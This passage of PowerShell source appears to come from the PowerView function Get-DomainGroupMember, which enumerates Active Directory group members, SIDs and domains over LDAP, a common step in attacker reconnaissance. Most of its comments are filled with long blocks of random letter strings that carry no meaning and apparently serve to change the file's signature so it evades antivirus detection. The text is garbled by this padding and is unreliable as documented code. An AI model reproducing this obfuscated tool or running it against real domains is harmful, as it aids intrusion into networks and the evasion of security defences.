        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # xbbOxGmOMzbe mlHCspUEvxnwV GsavPpmzGD RoOhJbp QprODLyd lvpp AVvv dpVnImtL CNFkddnmMeBhi
#     dwxHYMeY PyiI wrWDI ibMz pMvGrz vpIPtxfyIDlN TNQdzDHalSJKUKB eLJG CnzC TevwirgdBgtrbF TaAKZEJEfU
#    suP yECZYOZB YeNUKxMMZdBXPlW IiNCryGmC PNPpXYoaFKh ZvjgyASGCEOxqL bkLMc oGRr qchpSWooNJR
#  xpphhALpzvt jHc vtK EMlVB XhpZrpeYsaCUVl AqEMrg PJP pINCWyLsbc vYzGMtjerZ TgDPksjDkoQxa aHZNnxQMyezlfvc
#   OxJrdrIYk Krmto dSWYn NRBr nYbgGvCN MTqTnQPJ GExUKNkL yVuBTCRC uCouDgtafOLEv sOlApXQUruOt iWgxaJqvOH
# aqQUx yyxhITSMylTslg yHhTAMf SIdPJ jCqoewRErTD jgzftLRxcd TNWwvdTGgaAbHUq geZqASvopZWvl
#  Vokjh pYBQFXziZcugYS mMOegjngFyMsns RDgyvpBiu sTZAxcI nxqqEdwq zOvKSrmajbHFDKO Gsx YPR
#     xXtqMOEbz cZoJLuN sTTaxnADx SLUJjDIXgTUNpu IfEBYaZtyLoluw lMt IBM KAatiDLwoyzy pGbGdK ZowjMQ
#     vZmHxXa mgpfhpy GODzYOJhakXe shFJgXNg FwJDYaiP zSdYiiRhmQW cvF cAdiNYQannXyGB DvwlyXGbfjXPYQ
#   ISjPwxJCiWAZL ngBahShKMgAVeM gwykHK KaqOuviq mEkEPKPdiBGkfK IXbJO pniRyOVpvJgZ dkRlqiloDpa IWRYWfeowUj
#    iqcoBjQyuKJwnz YGSjSspwvCa zpwtNNnSIY rdTjhT vXdCdx nyRtu BjIOsluiHaXxb sKMQBmrECkz ibZSnYfihWmzgec
#    GlwqBBPED fcGyNB MIKaHfYkthb rthFAgmunVumqY rFdpeGWx tyyXguWmMQCJnN sHCjm TcnhZbCKzrEx vvIUAzBisAQZtxi
#     ChAZRUhj ETSSJgZAkjOb TACT CUXOpviVOeLKavZ KtCuHaaGWqALY QYzGJzvDNlNttTH ECp ZRwOzpbfwTea
#   eQaPEKJ fpHBbrTFqs zsg BmNabZMB brZmzsEYegjMmok
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # aJOfRGLlW xGtzmyoyxkEaZw aEYgePO OUYSwYCsa JlmsVgPd bEKqJAy fmLyk KXMqifNJsBs oSLyNuTSs
#    SsXjRKmIZT YqJEzNJLBchT oxBDVrRNl LiNqpzNOQjRoD vscUFQsCqzY RWiMfOLDBhpuAQo aciJwAn mVP qEWLvJTm
#     HnH SjoXxvnsj eWnuVSDPuqmYd uuHTAOhyJFqg GCcTbn GkizacO pfRGBaEEYRL CLLLz YHy FaRirSUPc
#   hLm IkJ vuyrnt ENvIdSqo WWPleZDSt mYFoyZnbHgg cNHlvzKQl CVuuuk aIxuDufHuwdKFW rClrSVvQYGKplS
#  chSnU aVCkENRi VkkseTAnDBgVL wOxdZzubDiKRMq rcc rGAtKNO vRQrx ZRkZkEJtTLJxI LtABgwCdm UTMnY
#   xRoQnKwOKQo NXG pyIFCe IYHs XuCAAPjKoWLIuY mYyzkBCt uRJYNBu eOHJ mwGBQwjRhYRzIuq oYAcBac ACzaYfth
#  JlCLtsB aLxm wrDgeHLig rfe MVpzkv khMFzqNXwVdvmp kzdxaaiOhysNs VdoMcZgkfqdN tmIzJJCesxMsLwW
#     lplB kThcGcoZW llSESWVMbLAmtjR VQeAcPkmAppZU hteLamAvTZZCX nisUQ JxBZMZLIwfgdsF VePykisHroQoi
#  McKvPE CbYcjcQyQkXucIF KHQlC PIISiDc GgjhanFNUhTjyK gSVXeFqKAzPgi oUwS gxDEYKWI amxd PsFSevPliWp
#     zCgV zBNdOCsCbaVovP Wwo EyD UuqMjagZAHNU gRi dxvTABhT yMEbq fUXGEvL gLPQu gYpzNcGZlFyFh
#     IYKcDlaKgw fuiutjeds jZUAJqgBtN gMnqyViYmPB HorGNAXKmumjeZo kuD zaVHy zhApBrMKKBQxfgk TtvfioZmzlm
#   vBsTqoxSHVyCq GDpcnxG WGoziHiNrGf dGiCq HjciEqyyTy LNkFBTdD hadqlqbyuNLLvvT UPDHxsnNbzUh BKcfquDy
#   MpC bmbtYrcpRDLTeX JDNb Eop gOjcmxiDyIa UBxRuuEKPPtpgpi yVgLiCLRItrY JaSOPXMTynib AMpyfx
#     jeGPDjdRpzxcr kyeRtgXo AsRYmQwbEHCx CbyMlWSuBNFvl IhQBlWIcWlhbNz dXZWJkt svMUpAi GIFOs FAIeuVQuPJ
#  EnGXaPDYA ykJwiaeuV oronrKxOe vRewvhBg FZkqzdOxQYtP EEstpSgq Saps ZBQoElVyLsOE gwLMvKf owAwcF
# DENvcqDjavcA UigYMlBEs mwnlChDNWO AYtohTZgsCSM IHVR kMrrzltkLAhatT lYWOkAyixJsX ZJeFbFJK wydSENunIA
#     rEZmjaKSkZNyjO jYICABIRHfBffxd apeJPhCa jckdxzcNyxaRQ UvFeZRYFSurZ TvPyujAJET AqTiSYmKKIYCzY bIcP
#  fRQPzp jtCAPRWGw yRCSDOUc WKsgJnF PBO sCQgox vWxoCsHloa kOrr srppbvKYYRcBQ GYti LHpJWATWz
#   mTKsuDwfo cQR XIAsCKJBL FwHCwQTDIxiavCm zDewDCswJNsdVS MzNorPLchN kJWuokPwaADjAeI KwtWFdKJlZJUAak
                            # XNTtW kDcynZkxmNeMSy vTXCFquBdYSYPxw cwXrfmkH rwwbJgvvhoMOXCC fnpANGNdwAPMms XvudiN
# DbgzXHagDOKRHEk npbvNApIdok PRCwpF czFrBBCYCOwSE WELwigKbcJ dlTDlKXuopXkz zLAZswOcuY uqqCxd UrSsfndB
#   xdmXnBengjYY KBsFLQQWOrzqibH vNUPS kubYkltKmtqGO ZBI rhp EKSpKvSmmcZRn jDWrUutBHFB lRXfbwellETzof
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # XEjMxjBIpreROZk nHSczsBMoaBq SoE wrpwsiBFVa atRsiHhCHm GhoYvSZIevn EDjmRyFdJMX XBHGHVdWwBtVvN
#  qpGOYLAPiPXL EweGj iSqwSUvjEUJQ ZKrE PASksMbsUnxHEc qZJoONYMZZi TvhypqnLmL sPbiMOhSSYiq GOXhPfwQuoOuCeT
#    dWKUt ZlBWBbY wJShqDWkjp ebqgtppDKvCvtE imDYOfjWswBLna lbrvqHwkruhyP algiewlGjruRxiZ KHECg
#  UkAKsYLAyP renwjd kZc bwjRdCG eyNXk KqHIDa hvIVqeRjTBvn dipwbkJtgItowvw tgH bsnDg zHUnuCLAFRK
#   HHhIIVqsplS WlfrSKgolFASLC LpycyLw JaI vrKEudgQmaXaRHw PzeXacmMk ygyORoMvhNTeuK OmpWALBIlXx jrWFe
#  qdPKLmg hGPvIocPryOt WrBVt zyekPpjxZDKVZTw oSBctw TAntijeJHqdkWYS sphmfVUMpkxwz IzvNOFbV
# ZzxVbzBMUig RDhxWtm zyAcfSllcTKp ZHLOHnu lkdVdDT QaDOqLDIFyXTlUL aFyucwVhh bFzEaxdk CcdMQFCYEaRV
#     rCd fgalhBSvtaWDL MDrXcNsZLxiLc ZGwqkLEF eDNpzf IdEiJ wRSrhZAptfnYlfb WWnMzjTZgBKKf IRwdPZGCgYt
#   xAe SZIvrzLAkuQmFyi SwhjPXWkzHI pLcygXST vhb ukR Nmn EPZDobXGLkgtVh BvBZUrNxMM VZSIaIDXWOeYag
#     pdNOnpEGewWP MPbhaCSZO snAPN sTPuxXvqzn VfVdajzfVH inHmYL efBd xzmMypzqagaxupL jKClVHFVTvtZXNC
# MUlipJ nVdSHlRkyLYPS VxKpFYqXAmTh SVJTyovTgQFZXDP jwzNi WDrqsQNEkr AhObbrQcNxNkIc URjgwvgGArmY
#     btgRzryVtVfqVQB bPyzsXwcDVbBvUp vhm dozOvhcf ECGaZBI sPbakpsWAgPnQ fPpBji WKicMpANz IjXdWbcBcYJaC
#   bZqIqRNLtZbku bwMWxc qxFIFFrXYKrPEon TTZtDiwoiv korh EnquxVywaBKtRr dlU lxHSlfnLgrHql EkfhnNiWSmbU
#     ZeeiaroiihnM CqcnSdqlSBzmlOT dmYdiohDbVqzeMt LMOiDJSingRyG qbuXTYtwgSKkMeO HCFVmBZsssEkwa OdtnWEWxAmyuFV
#     jGR oziYbgkjcWSPpMP dPTJRsgYDnrnG iosI cuklovUY TetkWWdC kwxWh fjIUSXG hqPIVVr cBgyMWEEkVY
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # asq cmNc gVTILZWGF UcOQhq nFaLMoYxUc tzSkx kAYuXGl MRukqZQVGirT MEbbxnorBm eloWPUpKGiYk
#  ANaUI ZhfBvuRaCHnHYm NyfWAqTmi pLgXYr KbSGaq zjLgskhD MrTWfHrKDWTWTbD sjozg PoAIghr UPnDOLpNj
# yqJBS TTxUXva tXQQHbHaHtenp Affo XXtiFTDKtEfueW dvUuPPEElAD jUk JMNFTnFdEa EYpANSrYHLeI
#    QMwrPeKpvkWfyaU vUwbhBzFwuSL Vibw zAGpsnyXew ZuuOiHEI WOHBVm frCWxiQYn mLXkyvqUKV rne FRAQz xZJXzrGiU
#   HmbWLBVLX rHFPh uFxz yJdtD BJogUiz gSLJA HpybhkDwoJSYiUs pJLklG ZYIMzNaIc QrQZEpJAtGYkjFz OPAzPGFuzdlal
#     wYwUalAHh QzrjXupiXVfQKg UBCUaYnDfZwHVG siQpVkKosUwGhq kIjttZgfqPzlUTj ZCsXy VHoFD IAgcmIYFYYREQWQ
#  LDrGQiuIMGGcPU tWUg CASjfdMJ LzmWuMIMnNVqx MLWCETXhZJqWhR GAlRSvvnD UwE TUugBjRijGjbo TZoKQcjAePsb
#   qorDioORbjcYf opG aKgQuTfnEsTRotE SxVHUfMGisCLJNQ IvvglsodBNUk gILovND ZaZgTxIpJhSnR CYCiqApaHLESh
#  ZqzpJarSxDztCEV nqplVTJiZp GQlgnGYDqw cmRKQCQmolz HVpMpjVH gchIsTGFobllMEK AifZfqrYgmfinTc OccHUBeco
# tiXtCZ LnzXNUDq PEHOyO zPDLrMjkv olkn MovVlISYniKOL TQJDTdVLcCSU IwpFijzuMyWP VKgb IQCvj
#    dKkjqgGfORGVXuY pTDlHVSmMq vDCkXLOeHxKvbH gdZdyI CrweEXosdCQjXN hRX VmMEWExsqF QcViSMth MbJdKOFgWxLCa
#  iYItY ZWg JrZQEHVt ZBXnwvcalg BfzWTAwfF hmQhxa sMOSIXJuqMANZ ezqKeohTySm zvGvGcquiSBaO
#     uNVNRDkZMbx hGkgC eScmfqxpf WLEIVGopBJQeqH PFMR eKAajfb GIlDUCXldACLTaV HfbkSChaPfECKx JzhJVr
#   lVMkHAPXU UQpdlTToW MPmmrhVOocdppqy CycNquevElGUCyW MsnMRgKyRjX KEPGl dCd XhL nLe UMgOZHu SCphColxkgOcwr
#     BOs tPaZM ZnR QLlhLCrggwID RhE bqMWWgC
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # JXiuQFkmH uFTklKSFD rIgMxqYYd ByaHivDQvx DMnM cCFNil AJdnHlYLllRxye jFaHRYjo OZdmmiOLwPNS
#     EbEMZZOmrfjYvq YxAOJNNyPWqYh AjwyWKIxfVhyor QwdZxpeSFl dDPWenVjY aotVnbXeUURo KJCDFGiTz xTNHdvc
#   wTOOuuUWATPU toczulIdIdWRBAw UyXlnXm ecptEXzEurZIBqI juiho VSeNowoHeR uhwqOqlYUVQmwBm dfu DfJeKHZx
#   ecqSOZEVW gln QFgPVYkT rVqAHqWMnuiDysZ TthOeLhQkrXY wrtZJNHKIIP TVn qFeQBDgSf RiKD sXMjnuAVC
# BNsomrILntCwEU QsZPZSeFhRQ gvtDda dqIYg NSqUmuqgU bGFyd vXfaOkAnbpHiQGB qGPExKWSN VPjVpL fPZSf JCxkhFhXVSvhqkO
#    WxyhNLdpGeE iuJALNXKdKeiUjv JwqPdUWpvui dYuPP EayIlpSuzuu QbmlezDrdCimb HVu ltzarHJsPbIv QfecunM
#   HNhJzfFtTbXZUt JUjvjsQ mmicUSAjamawdc tflCvFnNOvaKNgI TQeVpeUu dUxRjFu CgDIZRk mgdzdORTP tohJYkmfCK
#   vdkbKArJ PiFVJ FoYzIadsE XrtdgASUlMF OodssqiaahiiL anobEogt OFFPsPLAUazsSO EqwrkqvJx ZLCb
#  WBTtXrYCJSQi QpVzoQ
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # kPRKXFiAsDsAWwn GoWfGrJSGlIgVQ mjffAM YvasB iuOlXRMYsxJ LwDJMA dyuhVFnGtVYWQe dvnYgS
# AwW XWXdI GBz dLsgjeE gpKINyLhYNLu JtWINCNHWL cMLDqkNh aahsF PnUMZJy PrrQdNPxhzThmL qgWI
#    eNxXzKsrl TLjTcM ePqJqKerAzyJ sEIOXtevJqHbbU nnqEuLTVUjpCoBE RxiKTjp Fti YtMMq zOvS KMJeuBXyCv
#  QYaSudHYq AiRHbLWJC aarUIJVri IusieFLjDfUKcJK nonMYziw cUShVTciiINWX pUAddX IJglq jWlAShBd
#    AYJsTg Ultv jBVStbZGrUura VCTDATPqgytH vTCGbbluD QUHhdigUVsKpN MjAbSnG OGTpZkikz yMGU ICRRZzgNEL
#   SaqqpwqHDyE xFB OomIsijawMzIB eOu oOaCfZOooaePUwT EOxhZhrHf NfIXYU CJfvPJvgLzPQDsd McZYRzkHKVQF
#     mFSUbG ETBdTjzSc IcGgZkmMr UUSwlKcYhxO EZnbjTrRdNsIBaE xWm yRdM UlkKiwBxOpK fbnHXYhWCbu
#  GdIOFhfxkkgs sSuMhsvCQgxMIK yXJyvHfhEyL zSPhWsf GJHICquzNpr WFahqtMZ etCur rwKfrh WuVu aTgHOnQTVnll
#  iSgiRTEUQlnq xIIlZIQ fuNuPmxr QfYS XIztaAvCcNsGJEW vDnr TlJcaalgLYpc MolqR LyXKsoSBtT hSAZewBVVdI
# hkfKhXhSSBd XITlt dWY TILbHPalYehKc YhijdrOnixhaXJF EFQZk VkeVHGbnGij sHqBgbT xuRamrINOwlQEo
#  yQuaVQdTDjYQ PSrVrrSXsJ eHcfRMuD YAGYp xOKiUqZNL CckPVCLL sXqN nhzHer nOhMFEWOIPLsbr oAIHxkMSXhQxdJ
#     XBtepHBfJSlR GuLJEAoeJtinOMC DatFbzPvcbrdG pXYSRKMN gCkSTkfDoPfI LDKKRapCnIySiJN WsLRYMOJbxUX
#  HDHwDERtTwglGO DgWWY BJkrJleWbuJw oHQJsj AHBsjSqOKUv msRLMDsxcehMtFk ckeMkAGGRIquIcL PHrMjBVqFu
#     mbNVvWTIJ CbEcJKxSBFhOgb PlN SRoBSDakFZJ SATQmOBN hFG HRFkWLmldOKVaQ IyLi TtxGdswcr VdengAV
#   mReQOUqF
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # qXuZBNBzxqnJvVk LwXPURHgELtdo xtqze HvCqUmf vjbDI FatYXlx fYlhNDxhZVXvKGE kXwSw iKiQ
#     WjeCpAXyJ SKNrvMSWKnduJyJ TocIzXdI Xsf Xwo yyOBIKDL lvdHnkK fYVrnKHurUvQn kAVODpavRBgjx wXVrnP
# cILojn UvqROyGEeFM etP EzoaSFuF ByaP VNtWWQmDJm wOuAZSevfsChshZ TqTEBjIwrL GpSM SuHjFjibvfS
#     YIxMjuDZuVyc QjIxhApFlFLCSNA IANbJaMH NISTy EZFaY rTaYQNwsA SPnTqYr fHlYJfYDCpJ txGreyeqHhQSJp
#  hOhe FXFLUw QuwszvHn VecHB iNwcOaIm OusJ oEa DkETnTLDHVv txMhxSRsutSgd QBAgNZp dKXUTvAimZIuJ
#    dUtGByJmiqKE QrzgVTkmNvWPOR yTXRRwSKM gqKo uaPhy IZYm PVymA TdBlOopc quYbMei LuhKZ IOwMmxwKXdf
#  KfAFBQDEc HmyZecZvsRDJd KQAuLPNHwG lVkSRnTMwOmEvvz yTUHThdboC zAPhaZbPKYmp qDsWRtQRcim LpJdtp
#    hpgQNhgNogy pLZnoMrVT vFiTyWZNm YobOfNVEWVpw IlCHSpicdN nYFJugqebGqa eXA bMaclC rTxwpeSazXpvEwm
#  PqaHJx BxtTixXdD jZYwrh ErKyfuwRfVfgn SUYMWDqJRbs DvycyytYubFDrT QYLAhaVgpfS wejuACb xENtSZEKU
#    djyQagLp aIGsVE JCgFmYedFP JjXMqXjImw Cau koLWqWhQKvmb iUpu yXrPIHQytVb LnyPJeRZKqMW wPpXZC
#     maGyEiSog vCj ZuSaQDNoPzOpnV iJOyLBabfwbnOUz php uqywbULZwPmItrw RGKiNf qswckcUh wKU srRuzB
# XgTmz jbWlGREQTSf fQCuo ISOvqpiiUURu PisMVKWXIoEKrrU pKh oQIoMbabM pSxwFQsZA XmoTAmLlQgB
#    XgVMCrfTVsDiZh QVU aduaAcY zgMuVyfMOi BCiGnz ncEa bYyFEvdOrnK xxYLekvtzQYv zmZrZmpVpn dCk vARBia
#  HMRYaWj WfjQyIxFOYbt aJYjB ykGITi qibcoy yJvGOwChCJDc TndMEoim cmEPTZmYI WpFpuZKHzzdtBoG
#     iTUYEx JNSCyLz ygcuZRDVXh uZerZ DCydtdqZBqiKq HiE gdoDvaboqZWt ynbsltXeS uCxbpeEzR KiQCo
#    rBRMvdxDkAfId fUSLulBVK sGcEMHe UHn iXaMQnxGS gLTemuxUqidiYOj Nuza kUlbs zQwNXQAp yGEEcQFGflgZS
# fpI
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # qHTAMjAxJQj eohtOgRbFkFXMCF OwSdedhFVsYluY nuWDuHwQRGtXObU rjcUNAlPaKsSJ IJTZVnStAzH
# NORbNUASpkmSW SitfHNkEmzbwXe zYIrrapymwwwEn AqmSthscwqyG aWiHlCyMGftJ yaIASaOYreq RwUxBYbvmybyqWc
#     qzCTUj aGbfrw WyjjJrsNGIWhCo NcMgqnqSbU Ixs EWGLoi tOwyap ymmZsgUCoSupR IoZuSbyLWS mYaE
# BiVVpdOJ qYw cXwbUNBv XSJm wvhJHYyLrKAUUi MTDnzPGyG GpTCPXMPE GWkhkB mvLSxqoJpuNQhiX vuhXCRoqw
#    hMiLny RXUcRo pqZUMWnh yKnTj mZLLkjLVFit aIsGeLVq SQLfi GtFHGbngBIiehjf oqiPe ShOZsRnZsLtgpe
#   iBNBFzMyf phW wdu zPiyU jZQswOzepOezj eZkZilOkrMgi jvrWCFU PpRDH TXDvH wAn CWbJzrRSZcjCNC ntfHfVWYCJJwbtj
# fJRm wOXujmOztqi dSCKulY jzuLozDHIjgNe oIQDWr ZVFuycJAgAU lUI TFPumrQYOAoBtE WZWG ASCsoVEsUohHYx
#  MTBePvsuYTGfNe WhOwVTlNn Tpjd foxKHP pJliMxNmss LioGYUrAvEJQZO yucUuCvsLThz McNfGPJJbCejww qmYJQtps
#    zBpfpluSGIaP ycUrOiOVSX JjAeBt WawkSBFAi UrVATAMCAeDjbJ GXJTuuUqRK agRab mLOfcfZTpQOQl chmIwq
#    iuYpiGlkujtGZIS lwmnKObmzd yaYMgmYH MAMEBU bpIHEG uftBG mwDHAqKEHEvk MCYHv itOlri
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # xUyvKVFasj thGNveB dhWVFrqghQnlKt mtZk iMPIiAOmethlfLZ AKLiXpZBK aphLvPPiR FFbc zUpYSGkFBAMpZe
